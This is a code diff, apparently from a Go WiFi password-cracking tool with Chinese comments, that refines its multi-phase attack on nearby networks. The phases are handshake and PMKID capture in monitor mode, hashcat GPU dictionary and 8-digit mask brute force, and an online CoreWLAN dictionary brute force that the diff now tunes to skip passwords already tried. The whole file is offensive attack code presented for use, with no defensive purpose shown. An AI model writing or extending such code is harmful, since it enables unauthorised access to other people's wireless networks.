@@ -729,19 +729,24 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 		fmt.Printf("\r    - TOP %d个密码均未命中\n", len(topPasswords))
 
 		// ── Phase 3: 捕获握手包 + hashcat GPU字典攻击（分钟级） ──
-		// 检查是否有所需工具
+		// 检查所需工具和sudo权限
 		missingTools := capture.CheckTools()
 		hasGPUTools := len(missingTools) == 0
 		hashcatOK, _ := hashcrack.CheckHashcat()
+		hasSudo := capture.CheckSudo()
 
-		if hasGPUTools && hashcatOK {
+		gpuDone := false // 标记是否执行过GPU攻击（用于决定是否需要兆底）
+		if hasGPUTools && hashcatOK && hasSudo {
 			fmt.Println("  [Phase 3] 握手包捕获 + GPU字典攻击...")
-			fmt.Println("    [!] 此阶段需要sudo权限，可能需要输入密码")
 
 			cfg := capture.DefaultCaptureConfig()
 			cfg.Verbose = verbose
 
 			capResult := capture.CaptureHandshake(t.SSID, t.BSSID, t.Channel, cfg)
+
+			// 捕获后必须恢复WiFi接口（tcpdump -I会设为监控模式）
+			capture.RestoreWiFiInterface(cfg.Interface)
+
 			if capResult.Success {
 				fmt.Printf("    ✓ 捕获成功（PMKID=%v, 握手=%v），启动GPU字典攻击...\n",
 					capResult.HasPMKID, capResult.HasHandshk)
@@ -768,7 +773,6 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 
 				// ── Phase 4: hashcat GPU掩码暴力（分钟~小时级） ──
 				fmt.Println("  [Phase 4] GPU掩码暴力攻击（8位纯数字起步）...")
-				// 只尝试8位数字掩码（约32分钟），更长的掩码耗时太久
 				hcfg.MaskAttacks = []string{"?d?d?d?d?d?d?d?d"}
 				hcfg.Timeout = 40 * time.Minute
 				mResult := hashcrack.CrackWithMask(hcfg)
@@ -779,27 +783,49 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 					continue
 				}
 				fmt.Println("    - 8位纯数字掩码未命中")
+				gpuDone = true
 			} else {
 				fmt.Printf("    ✗ 握手包捕获失败: %s\n", capResult.Error)
 			}
 		} else {
-			if len(missingTools) > 0 {
+			// 输出跳过原因
+			if !hasSudo {
+				fmt.Println("  [Phase 3-4] 跳过GPU攻击（无sudo权限，请用 sudo ./wifi-crack --all 运行）")
+			} else if len(missingTools) > 0 {
 				fmt.Printf("  [Phase 3-4] 跳过GPU攻击（缺少工具: %s）\n", strings.Join(missingTools, ", "))
 			}
 		}
 
-		// ── Phase 5: CoreWLAN在线完整字典爆破（兜底） ──
-		fmt.Println("  [Phase 5] CoreWLAN在线完整字典爆破（兜底方案）...")
-		allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
-		crackCfg := cracker.CrackConfig{
-			Delay:    time.Duration(delay) * time.Millisecond,
-			Verbose:  verbose,
-			MaxRetry: 1,
-		}
-		scanner.CacheTarget(t.SSID)
-		result := cracker.CrackOne(t, allPwds, crackCfg)
-		if result.Success {
-			successCount++
+		// ── Phase 5: CoreWLAN在线字典爆破（兆底，排除Phase 2已试的TOP密码） ──
+		// 如果GPU攻击已完成字典+8位数字暴力都未命中，在线爆破也极不可能成功，跳过
+		if gpuDone {
+			fmt.Println("  [Phase 5] 跳过在线爆破（GPU已完成字典+暴力均未命中，在线更慢无意义）")
+		} else {
+			fmt.Println("  [Phase 5] CoreWLAN在线字典爆破（兆底方案）...")
+			// 构建完整字典并排除Phase 2已试的TOP密码
+			allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
+			topSet := make(map[string]bool)
+			for _, p := range topPasswords {
+				topSet[p] = true
+			}
+			var remainPwds []string
+			for _, p := range allPwds {
+				if !topSet[p] {
+					remainPwds = append(remainPwds, p)
+				}
+			}
+			if len(remainPwds) > 0 {
+				crackCfg := cracker.CrackConfig{
+					Delay:    time.Duration(delay) * time.Millisecond,
+					Verbose:  verbose,
+					MaxRetry: 1,
+				}
+				scanner.CacheTarget(t.SSID)
+				result := cracker.CrackOne(t, remainPwds, crackCfg)
+				if result.Success {
+					successCount++
+				}
+			}
 		}
 	}
 
